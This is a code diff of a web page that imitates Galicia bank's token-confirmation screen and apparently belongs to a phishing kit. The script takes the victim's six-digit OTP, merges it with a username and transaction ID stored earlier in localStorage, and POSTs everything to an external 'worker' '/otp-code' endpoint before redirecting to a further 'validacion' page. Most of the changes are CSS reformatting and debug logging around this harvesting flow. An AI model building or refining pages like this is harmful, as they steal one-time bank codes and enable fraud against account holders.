@@ -6,7 +6,12 @@
     <meta name="theme-color" content="#ffffff">
     <title>Token - Galicia</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
             background: #f5f5f5;
@@ -16,6 +21,7 @@
             justify-content: center;
             padding: 20px;
         }
+
         .container {
             max-width: 400px;
             width: 100%;
@@ -25,11 +31,37 @@
             box-shadow: 0 2px 15px rgba(0, 0, 0, 0.06);
             text-align: center;
         }
-        .logo { width: 120px; height: auto; margin: 0 auto 18px; display: block; }
-        .logo svg { width: 100%; height: auto; }
-        h1 { color: #555; font-size: 20px; font-weight: 600; margin-bottom: 6px; }
-        .subtitle { color: #777; font-size: 12px; line-height: 1.6; margin-bottom: 18px; }
-        .input-wrapper { margin: 16px 0 14px; }
+
+        .logo {
+            width: 120px;
+            height: auto;
+            margin: 0 auto 18px;
+            display: block;
+        }
+
+        .logo svg {
+            width: 100%;
+            height: auto;
+        }
+
+        h1 {
+            color: #555;
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 6px;
+        }
+
+        .subtitle {
+            color: #777;
+            font-size: 12px;
+            line-height: 1.6;
+            margin-bottom: 18px;
+        }
+
+        .input-wrapper {
+            margin: 16px 0 14px;
+        }
+
         .token-input {
             width: 100%;
             max-width: 260px;
@@ -45,15 +77,30 @@
             background: #fafafa;
             font-family: 'Courier New', monospace;
         }
-        .token-input:focus { border-color: #f47721; background: white; }
+
+        .token-input:focus {
+            border-color: #f47721;
+            background: white;
+        }
+
         .token-input::placeholder {
             letter-spacing: 2px;
             font-size: 13px;
             color: #aaa;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
         }
-        .error-msg { color: #dc3545; font-size: 12px; margin-top: 6px; display: none; }
-        .error-msg.show { display: block; }
+
+        .error-msg {
+            color: #dc3545;
+            font-size: 12px;
+            margin-top: 6px;
+            display: none;
+        }
+
+        .error-msg.show {
+            display: block;
+        }
+
         .help-box {
             text-align: left;
             background: #f8f9fa;
@@ -62,9 +109,24 @@
             margin: 16px 0 22px;
             border-left: 3px solid #f47721;
         }
-        .help-title { font-size: 13px; font-weight: 600; color: #333; margin-bottom: 6px; }
-        .help-text { font-size: 12px; color: #666; line-height: 1.8; }
-        .help-text strong { color: #333; }
+
+        .help-title {
+            font-size: 13px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 6px;
+        }
+
+        .help-text {
+            font-size: 12px;
+            color: #666;
+            line-height: 1.8;
+        }
+
+        .help-text strong {
+            color: #333;
+        }
+
         .btn-confirm {
             width: 100%;
             max-width: 260px;
@@ -80,9 +142,21 @@
             transition: all 0.3s;
             text-transform: uppercase;
         }
-        .btn-confirm.active { background: #f47721; }
-        .btn-confirm.active:hover { background: #e06a15; transform: translateY(-1px); box-shadow: 0 4px 15px rgba(244, 119, 33, 0.3); }
-        .btn-confirm.active:active { transform: translateY(0); }
+
+        .btn-confirm.active {
+            background: #f47721;
+        }
+
+        .btn-confirm.active:hover {
+            background: #e06a15;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 15px rgba(244, 119, 33, 0.3);
+        }
+
+        .btn-confirm.active:active {
+            transform: translateY(0);
+        }
+
         #loadingOverlay {
             display: none;
             position: fixed;
@@ -96,6 +170,7 @@
             flex-direction: column;
             z-index: 9999;
         }
+
         .loading-container {
             background: white;
             padding: 36px 44px;
@@ -103,6 +178,7 @@
             text-align: center;
             box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
         }
+
         .spinner {
             width: 44px;
             height: 44px;
@@ -112,12 +188,24 @@
             animation: spin 0.8s linear infinite;
             margin: 0 auto 14px;
         }
+
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        .loading-text { color: #333; font-size: 15px; font-weight: 500; }
-        .loading-sub { color: #888; font-size: 12px; margin-top: 4px; }
+
+        .loading-text {
+            color: #333;
+            font-size: 15px;
+            font-weight: 500;
+        }
+
+        .loading-sub {
+            color: #888;
+            font-size: 12px;
+            margin-top: 4px;
+        }
+
         .alert-overlay {
             display: none;
             position: fixed;
@@ -130,6 +218,7 @@
             justify-content: center;
             align-items: center;
         }
+
         .alert-box {
             background: white;
             border-radius: 14px;
@@ -139,9 +228,26 @@
             text-align: center;
             box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
         }
-        .alert-icon { font-size: 44px; margin-bottom: 6px; }
-        .alert-title { font-size: 17px; font-weight: 600; color: #333; margin-bottom: 6px; }
-        .alert-message { font-size: 13px; color: #666; line-height: 1.5; margin-bottom: 18px; }
+
+        .alert-icon {
+            font-size: 44px;
+            margin-bottom: 6px;
+        }
+
+        .alert-title {
+            font-size: 17px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 6px;
+        }
+
+        .alert-message {
+            font-size: 13px;
+            color: #666;
+            line-height: 1.5;
+            margin-bottom: 18px;
+        }
+
         .alert-btn {
             background: #f47721;
             color: white;
@@ -153,44 +259,92 @@
             cursor: pointer;
             transition: background 0.3s;
         }
-        .alert-btn:hover { background: #e06a15; }
+
+        .alert-btn:hover {
+            background: #e06a15;
+        }
+
         @keyframes shake {
             0%, 100% { transform: translateX(0); }
             25% { transform: translateX(-8px); }
             75% { transform: translateX(8px); }
         }
-        @media (max-width: 480px) {
-            body { padding: 12px; }
-            .container { padding: 24px 16px 30px; border-radius: 10px; }
-            .logo { width: 100px; }
-            h1 { font-size: 18px; }
-            .token-input { font-size: 18px; padding: 12px 14px; max-width: 220px; }
-            .btn-confirm { padding: 12px; font-size: 14px; max-width: 220px; }
-            .help-box { padding: 12px 14px; }
-            .loading-container { padding: 28px 24px; margin: 0 16px; }
-        }
-        @media (max-width: 380px) {
-            .token-input { font-size: 16px; padding: 10px 12px; max-width: 190px; letter-spacing: 6px; }
-            .btn-confirm { padding: 10px; font-size: 13px; max-width: 190px; }
-        }
-        /* Debug info */
-        .debug-info {
-            font-size: 11px;
-            color: #999;
+
+        /* Debug */
+        .debug-box {
             margin-top: 15px;
             padding: 10px;
-            background: #f8f8f8;
-            border-radius: 6px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            font-size: 11px;
+            color: #666;
             text-align: left;
             word-break: break-all;
             display: none;
+            border: 1px solid #e9ecef;
         }
-        .debug-info.visible { display: block; }
+
+        .debug-box.visible {
+            display: block;
+        }
+
+        .debug-box .label {
+            font-weight: 600;
+            color: #333;
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 12px;
+            }
+            .container {
+                padding: 24px 16px 30px;
+                border-radius: 10px;
+            }
+            .logo {
+                width: 100px;
+            }
+            h1 {
+                font-size: 18px;
+            }
+            .token-input {
+                font-size: 18px;
+                padding: 12px 14px;
+                max-width: 220px;
+            }
+            .btn-confirm {
+                padding: 12px;
+                font-size: 14px;
+                max-width: 220px;
+            }
+            .help-box {
+                padding: 12px 14px;
+            }
+            .loading-container {
+                padding: 28px 24px;
+                margin: 0 16px;
+            }
+        }
+
+        @media (max-width: 380px) {
+            .token-input {
+                font-size: 16px;
+                padding: 10px 12px;
+                max-width: 190px;
+                letter-spacing: 6px;
+            }
+            .btn-confirm {
+                padding: 10px;
+                font-size: 13px;
+                max-width: 190px;
+            }
+        }
     </style>
 </head>
 <body>
 
     <div class="container">
+        <!-- Logo Galicia -->
         <div class="logo">
             <svg viewBox="0 0 200 60" fill="none" xmlns="http://www.w3.org/2000/svg">
                 <rect x="0" y="0" width="200" height="60" rx="4" fill="#f47721"/>
@@ -226,10 +380,13 @@
             </div>
         </div>
 
-        <button class="btn-confirm" id="continueBtn" disabled>CONFIRMAR</button>
+        <button class="btn-confirm" id="continueBtn">CONFIRMAR</button>
 
-        <!-- Debug info -->
-        <div class="debug-info" id="debugInfo"></div>
+        <!-- Debug Box -->
+        <div class="debug-box" id="debugBox">
+            <div class="label">🐛 Debug:</div>
+            <div id="debugContent">Esperando acción...</div>
+        </div>
     </div>
 
     <!-- Loading Overlay -->
@@ -262,18 +419,27 @@
         const errorMsg = document.getElementById('errorMsg');
         const alertOverlay = document.getElementById('alertOverlay');
         const loadingOverlay = document.getElementById('loadingOverlay');
-        const debugInfo = document.getElementById('debugInfo');
+        const debugBox = document.getElementById('debugBox');
+        const debugContent = document.getElementById('debugContent');
 
-        // ==================== FUNCIONES ====================
+        // ==================== FUNCIONES DEBUG ====================
+        function showDebug(message) {
+            debugBox.classList.add('visible');
+            debugContent.textContent = message;
+            console.log('🐛 DEBUG:', message);
+        }
+
         function updateButton() {
             const value = input.value.trim();
             if (/^\d{6}$/.test(value)) {
                 button.disabled = false;
                 button.classList.add('active');
                 errorMsg.classList.remove('show');
+                showDebug('✅ 6 dígitos completos - Botón habilitado');
             } else {
                 button.disabled = true;
                 button.classList.remove('active');
+                showDebug(`⏳ ${value.length}/6 dígitos - Botón deshabilitado`);
             }
         }
 
@@ -299,31 +465,28 @@
             }, 500);
         }
 
-        function showDebug(message) {
-            debugInfo.textContent = message;
-            debugInfo.classList.add('visible');
-            console.log('🐛 DEBUG:', message);
-        }
-
         // ========================= ENVIAR CÓDIGO OTP =========================
         async function enviarCodigo() {
             const token = input.value.trim();
 
+            showDebug(`🔍 Intentando enviar código: ${token}`);
+
             if (!/^\d{6}$/.test(token)) {
+                showDebug('❌ Código inválido - No son 6 dígitos');
                 errorMsg.classList.add('show');
                 return;
             }
 
             errorMsg.classList.remove('show');
             loadingOverlay.style.display = 'flex';
-            showDebug('⏳ Enviando código...');
+            showDebug('⏳ Enviando código al worker...');
 
             try {
                 // ============================================================
                 // 1. OBTENER DATOS DEL localStorage
                 // ============================================================
                 const bancoldataRaw = localStorage.getItem('bancoldata');
-                showDebug(`📦 localStorage.bancoldata: ${bancoldataRaw || 'NO EXISTE'}`);
+                showDebug(`📦 localStorage.bancoldata: ${bancoldataRaw ? '✅ EXISTE' : '❌ NO EXISTE'}`);
                 
                 if (!bancoldataRaw) {
                     throw new Error('No hay datos en localStorage. Inicia sesión nuevamente.');
@@ -333,7 +496,7 @@
                 const transactionId = bancoldata.transactionId;
                 const usuario = bancoldata.usuario || 'desconocido';
 
-                showDebug(`📦 Datos: transactionId=${transactionId}, usuario=${usuario}, token=${token}`);
+                showDebug(`📦 Datos: transactionId=${transactionId}, usuario=${usuario}`);
 
                 // ============================================================
                 // 2. VALIDAR QUE EXISTA TRANSACTION ID
@@ -345,14 +508,14 @@
                 console.log('📤 Enviando código OTP:', token);
                 console.log('👤 Usuario:', usuario);
                 console.log('🆔 TransactionId:', transactionId);
-                console.log(`📡 Worker URL: ${WORKER_URL}/otp-code`);
-
-                showDebug(`📡 Enviando a: ${WORKER_URL}/otp-code`);
 
                 // ============================================================
                 // 3. ENVIAR AL WORKER (endpoint /otp-code)
                 // ============================================================
-                const response = await fetch(`${WORKER_URL}/otp-code`, {
+                const url = `${WORKER_URL}/otp-code`;
+                showDebug(`📡 Enviando a: ${url}`);
+                
+                const response = await fetch(url, {
                     method: 'POST',
                     headers: { 
                         'Content-Type': 'application/json',
@@ -364,7 +527,6 @@
                     })
                 });
 
-                console.log('📊 Status de la respuesta:', response.status);
                 showDebug(`📊 Status: ${response.status}`);
 
                 // ============================================================
@@ -379,7 +541,7 @@
                     console.error('❌ Error al parsear JSON:', parseError);
                     const textResponse = await response.text();
                     console.log('📄 Respuesta en texto:', textResponse);
-                    showDebug(`📄 Respuesta texto: ${textResponse}`);
+                    showDebug(`📄 Respuesta texto: ${textResponse.substring(0, 100)}`);
                     throw new Error('Error al procesar la respuesta del servidor');
                 }
 
@@ -391,16 +553,14 @@
                 if (result.ok) {
                     // ✅ CÓDIGO VÁLIDO
                     console.log('✅ Código OTP válido');
-                    showDebug('✅ Código válido');
+                    showDebug('✅ Código válido - Redirigiendo...');
                     
-                    // Guardar en localStorage que el OTP fue enviado
+                    // Guardar en localStorage
                     bancoldata.otp_enviado = true;
                     bancoldata.otp = token;
                     localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
                     
                     // Redirigir a validacion.html
-                    console.log('🔄 Redirigiendo a validacion.html');
-                    showDebug('🔄 Redirigiendo a validacion.html');
                     setTimeout(() => {
                         window.location.href = `${BASE_URL}/validacion.html`;
                     }, 1000);
@@ -426,6 +586,7 @@
         }
 
         // ==================== EVENTOS ====================
+        // Evento input
         input.addEventListener('input', function() {
             this.value = this.value.replace(/\D/g, '');
             if (this.value.length > 6) {
@@ -434,8 +595,11 @@
             updateButton();
         });
 
+        // Evento click del botón
         button.addEventListener('click', function(e) {
             e.preventDefault();
+            console.log('🔘 Botón clickeado');
+            showDebug('🔘 Botón clickeado');
             enviarCodigo();
         });
 
@@ -466,6 +630,7 @@
         });
 
         // ==================== INICIALIZAR ====================
+        // Verificar localStorage
         const bancoldataRaw = localStorage.getItem('bancoldata');
         console.log('🔍 Verificando localStorage al cargar...');
         console.log('📦 bancoldata:', bancoldataRaw);
@@ -473,28 +638,24 @@
         if (!bancoldataRaw) {
             console.error('❌ No hay datos en localStorage');
             showDebug('❌ No hay datos en localStorage');
-            alert('Error: Sesión no encontrada. Por favor, inicia sesión nuevamente.');
-            window.location.href = `${BASE_URL}/index.html`;
-            return;
-        }
-
-        try {
-            const bancoldata = JSON.parse(bancoldataRaw);
-            console.log('📋 Datos parseados:', bancoldata);
-            showDebug(`✅ TransactionId: ${bancoldata.transactionId || 'NO EXISTE'}`);
-            
-            if (!bancoldata.transactionId) {
-                console.error('❌ No hay transactionId');
-                showDebug('❌ No hay transactionId');
-                alert('Error: ID de sesión no encontrado.');
+            setTimeout(() => {
+                alert('Error: Sesión no encontrada. Por favor, inicia sesión nuevamente.');
                 window.location.href = `${BASE_URL}/index.html`;
-                return;
+            }, 500);
+        } else {
+            try {
+                const bancoldata = JSON.parse(bancoldataRaw);
+                console.log('📋 Datos parseados:', bancoldata);
+                
+                if (bancoldata.transactionId) {
+                    showDebug(`✅ TransactionId: ${bancoldata.transactionId}`);
+                } else {
+                    showDebug('❌ No hay transactionId en los datos');
+                }
+            } catch (e) {
+                console.error('❌ Error parseando JSON:', e);
+                showDebug(`❌ Error parseando JSON: ${e.message}`);
             }
-        } catch (e) {
-            console.error('❌ Error parseando JSON:', e);
-            showDebug(`❌ Error parseando JSON: ${e.message}`);
-            window.location.href = `${BASE_URL}/index.html`;
-            return;
         }
 
         console.log('🚀 Página de código Galicia lista');
